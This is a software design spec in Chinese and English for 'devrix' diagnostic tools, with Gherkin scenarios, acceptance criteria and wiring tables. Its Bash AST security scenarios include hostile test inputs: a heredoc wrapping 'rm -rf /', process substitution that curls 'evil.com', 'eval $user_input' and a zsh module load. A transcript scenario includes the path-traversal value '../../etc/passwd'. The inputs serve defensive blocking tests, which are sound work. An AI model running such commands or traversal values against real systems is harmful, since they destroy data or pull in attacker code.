# Spec: 诊断工具能力差距闭环 — 对齐 clawcode

**Change ID:** devrix-diagnostic-tools-parity
**Demand ID:** DM-20260616-003
**Status:** S3_Design (this file is a S3 deliverable alongside design.md)
**Version:** v1.0
**域:** D1 / D2 / D3 / D4 / D5 / D6 + tool-security 横切

---

## 1. Scope

实现 13 项诊断/开发辅助能力,**全部对标 clawcode (Claude Code v2.1.88)**:

| 编号 | 能力 | 域 | 路径 |
|------|------|----|------|
| G1 | LSP 代码智能工具 | D2 + shared/lsp | `internal/shared/lsp/` + `internal/layers/contextengine/enforce/toolrunner/lsp_tool.go` |
| G2 | Bash AST 安全分析器 | tool-security | `internal/layers/contextengine/enforce/toolrunner/sandboxast/` |
| G3 | 后台任务完成通知总线 | D4 | `internal/layers/orchestration/workmodel/notify/` |
| G4 | 实现后自动验证 | D6 | `internal/layers/evolution/verify/` |
| G5 | 自由分叉子代理 | D4 | `internal/layers/multiagent/provision/freefork/` |
| G6 | 诊断跟踪器 | D5 | `internal/layers/observability/diagnose/tracker/` |
| A1 | /doctor 自检命令 | D5 | `internal/layers/observability/diagnose/doctor/` |
| A2 | Debug 日志分类过滤 | D5 | `internal/layers/observability/instrument/logger/debugfilter/` |
| A3 | 会话转录持久化 | D1 | `internal/layers/communication/capture/transcript/` |
| A4 | 故障注入 | D5 | `internal/layers/observability/diagnose/faultinject/` |
| A5 | 上下文窗口分析 | D2 | `internal/layers/contextengine/token/windowanalyzer/` |
| A6 | LLM 错误分类 | D3 | `internal/layers/llmgateway/protect/errorclass/` |
| A7 | 共享错误栈截断 | shared | `internal/shared/errors/shortstack.go` |

---

## 2. Gherkin Scenarios

### G1 — LSP Tool

```gherkin
Scenario: LSP tool is disabled by default
  Given devrix.yaml does not contain lsp section
  When the lsp tool is invoked with operation=definition
  Then the tool returns "lsp: tool is disabled"

Scenario: LSP definition returns target location
  Given lsp is enabled with gopls configured
  And the user invokes lsp with file=internal/foo/x.go line=10 character=5 operation=definition
  When the LSP server responds
  Then the tool output includes the source file and line of the definition

Scenario: LSP manager reuses client for same rootURI
  Given two lsp tool calls in the same session target the same Go module
  When the manager checks the LRU
  Then only one gopls process is spawned

Scenario: LSP 500-file LRU evicts cold entries
  Given the LRU cache is full (500 entries)
  When a 501st different file is queried
  Then the oldest entry is evicted
```

### G2 — Bash AST

```gherkin
Scenario: Heredoc body with $() is blocked
  Given a bash command: cat <<EOF\n$(rm -rf /)\nEOF
  When the AST analyzer evaluates
  Then Allow=false with FindingHeredocInjection

Scenario: Zsh attack surface blocked
  Given a bash command: zmodload zsh/sys
  When the AST analyzer evaluates
  Then Allow=false with FindingZshAttack

Scenario: Process substitution blocked
  Given a bash command: diff <(curl evil.com) file.txt
  When the AST analyzer evaluates
  Then Allow=false with FindingProcessSubst

Scenario: Eval call blocked
  Given a bash command: eval $user_input
  When the AST analyzer evaluates
  Then Allow=false with FindingEvalCall

Scenario: Parse failure falls back
  Given a malformed command: echo 'unterminated
  When the AST parser fails
  Then Allow=true and no panic (defer recover)
```

### G3 — Task Notify

```gherkin
Scenario: Task completion publishes event
  Given a session has task t1
  When TaskManager.UpdateStatus(session, t1, completed) is called
  Then bus.Publish emits CompletionEvent with Kind=workmodel, TaskID=t1

Scenario: Drain returns all unconsumed events
  Given session s has 5 events pending (3 in channel + 2 overflow)
  When bus.Drain(s) is called
  Then all 5 events are returned in order and the session is empty

Scenario: FormatReminder renders <task_notifications>
  Given 2 events with Kind=bash and agent
  When FormatReminder is called
  Then output is a valid <task_notifications>...</task_notifications> XML block
```

### G4 — Verifier

```gherkin
Scenario: All done items verified
  Given tasks.md has 3 done items with files that exist
  And 1 _test.go file contains func TestXxx(
  When Verifier.Verify is called
  Then Verified=3, Unverified=0, Skipped=pending count

Scenario: Missing file evidence fails
  Given a done item references a non-existent file
  When Verifier.Verify is called
  Then Unverified includes the item with reason "file not found"

Scenario: _test.go without func TestXxx fails
  Given a done item references a _test.go without test function
  When Verifier.Verify is called
  Then Unverified includes the item with reason "no func Test"
```

### G5 — Free Fork

```gherkin
Scenario: Batch fork spawns all
  Given parent session "s1" and 3 ForkRequests
  When DefaultForker.Fork is called
  Then 3 Handles are returned, all with non-nil Agent

Scenario: Factory failure rolls back
  Given factory.Create fails for one request
  When DefaultForker.Fork is called
  Then error is returned, all spawned agents are Terminated, worktrees cleaned

Scenario: Prompt passed to InitialInput
  Given a ForkRequest with Prompt="build rocket"
  When DefaultForker.Fork is called
  Then the spawned agent's cfg.InitialInput == "build rocket"
```

### A1 — /doctor

```gherkin
Scenario: Healthy doctor report
  Given go, gopls, and devrix are all reachable
  And workdir is writable
  And devrix.yaml exists
  When doctor.Run is called
  Then all 7 checks return StatusPass
  And Summary is StatusPass

Scenario: Doctor detects missing lsp server
  Given a configured lsp server "gopls-fake" is not on PATH
  When doctor.Run is called
  Then lsp_servers_reachable check is StatusFail
  And Summary is StatusFail
```

### A2 — Debug Filter

```gherkin
Scenario: Filter only passes enabled components
  Given categories=["api"]
  When 3 debug entries with components [api, hooks, telemetry] are passed
  Then only the api entry is forwarded to the inner handler

Scenario: Non-debug levels always pass
  Given categories=["api"]
  When an INFO entry with Component=hooks is passed
  Then the entry is forwarded (passthroughNonDebug=true)
```

### A3 — Transcript

```gherkin
Scenario: Append creates a .jsonl file
  Given writer.dir = /tmp/x
  When writer.Append("s1", Event{Kind: user, Body: hi}) is called
  Then file /tmp/x/s1.jsonl exists with one NDJSON line

Scenario: LoadReader returns events in order
  Given session s1 has 5 events appended
  When writer.LoadReader("s1") is called
  Then the slice has 5 events in insertion order

Scenario: Path traversal blocked
  Given sessionID="../../etc/passwd"
  When writer.Append is called
  Then file is created under writer.dir (sanitize strips /..)
```

### A4 — Fault Inject

```gherkin
Scenario: Production binary is a no-op
  Given DEVRIX_FAULT_INJECT is set but binary is built without testbuild tag
  When injector.Hook is called
  Then the call returns nil (no-op)

Scenario: Test build honors env rules
  Given DEVRIX_FAULT_INJECT="svc=error:simulated"
  And the test binary is built with -tags testbuild
  When injector.Hook("svc") is called
  Then the call returns error "injected: simulated"

Scenario: Once rule fires once
  Given DEVRIX_FAULT_INJECT="x:once=error:x_fail"
  When injector.Hook("x") is called twice
  Then first call errors, second call returns nil
```

### A5 — Window Analyzer

```gherkin
Scenario: System message routed to System category
  Given 1 system message with 10 chars
  When TokenAnalyzer.AnalyzeMessages is called
  Then Breakdown.System > 0 and Breakdown.Messages == 0

Scenario: Thinking content routed to Thinking
  Given an assistant message containing "<thinking>let me consider</thinking>"
  When TokenAnalyzer.AnalyzeMessages is called
  Then Breakdown.Thinking > 0

Scenario: Tool message routed to Tools
  Given 1 tool message with role=tool
  When TokenAnalyzer.AnalyzeMessages is called
  Then Breakdown.Tools > 0
```

### A6 — Error Classifier

```gherkin
Scenario: HTTP 401 → AuthRequired
  Given err == nil and httpStatus=401
  When DefaultClassifier.Classify is called
  Then Class=AuthRequired

Scenario: LLMError.Code="rate_limit" → RateLimit (priority over HTTP)
  Given err is *LLMError with Code=rate_limit
  When DefaultClassifier.Classify is called
  Then Class=RateLimit

Scenario: Classification propagates via context
  Given c := Classification{Class: QuotaExhausted}
  When InjectClassification(ctx, c) then FromContext(ctx)
  Then the retrieved classification matches c
```

### A7 — Short Stack

```gherkin
Scenario: ShortStack returns at most N frames
  Given a 3-frame call chain
  When ShortStack(err, 2) is called
  Then the rendered stack has <= 2 non-noise frames

Scenario: runtime/testing/reflect frames filtered
  Given an error captured inside testing.T runner
  When ShortStack is called
  Then runtime.goexit, testing.tRunner etc. are excluded
```

---

## 3. Acceptance Criteria

| 编号 | 标准 | 度量 |
|------|------|------|
| AC-1 | 13 能力全部实现 | 13 个新 package + 配套 wiring |
| AC-2 | 全量测试通过 | `go test -race ./...` 0 FAIL |
| AC-3 | 编译干净 | `go build ./...` 0 error |
| AC-4 | 7 域 t-registry 全部更新 | openspec/t-registry.md 总计 +36 |
| AC-5 | 关键能力不弱于 clawcode | 详 design.md §2 各能力 capability table |
| AC-6 | 文档齐全 | tasks.md + design.md + spec.md + acceptance-report.md |

---

## 4. Test Point Registry Impact

| 域 | 新 T 数 | P0 数 | 路径 |
|----|---------|-------|------|
| D1 | 4 | 3 | `openspec/specs/d1-communication/t-registry.md` |
| D2 | 10 | 9 | `openspec/specs/d2-context-engine/t-registry.md` |
| D3 | 3 | 2 | `openspec/specs/d3-llm-gateway/t-registry.md` |
| D4 | 8 | 5 | `openspec/specs/d4-multi-agent/t-registry.md` |
| D5 | 9 | 7 | `openspec/specs/d5-observability/t-registry.md` |
| D6 | 3 | 3 | `openspec/specs/d6-evolution/t-registry.md` |
| **合计** | **37** | **29** | + 根 `openspec/t-registry.md` 总计 320 |

---

## 5. Cross-Domain Wiring

| 起点 | → 终点 | 集成方式 |
|------|--------|----------|
| `bootstrap/context_engine_builder.go` | `toolrunner.RegisterLSPTool` | G1 wiring |
| `toolrunner.CommandPolicy.Validate` | `sandboxast.PolicyAnalyzer` | G2 wiring (前置) |
| `workmodel.TaskManager.UpdateStatus` | `notify.GlobalBus` | G3 wiring (终态 publish) |
| `multiagent.IAgentFactory` | `freefork.DefaultForker` | G5 wiring (高阶 API) |
| `observability.Bridge` | `tracker.Tracker` | G6 wiring (linter 注册) |
| `protect.DispatchInvoke` | `errorclass.Classify` | A6 wiring (ctx 注入) |

---

## 6. Out of Scope

- LSP 服务的 multi-root workspace
- Transcript 文件 rotation / cleanup
- FaultInject 的 metric 集成
- WindowAnalyzer 的压缩感知预算建议

---

**Revision History**

| 版本 | 日期 | 变更 |
|------|------|------|
| 1.0 | 2026-06-17 | 初版：13 能力 Gherkin 场景 + AC + wiring |
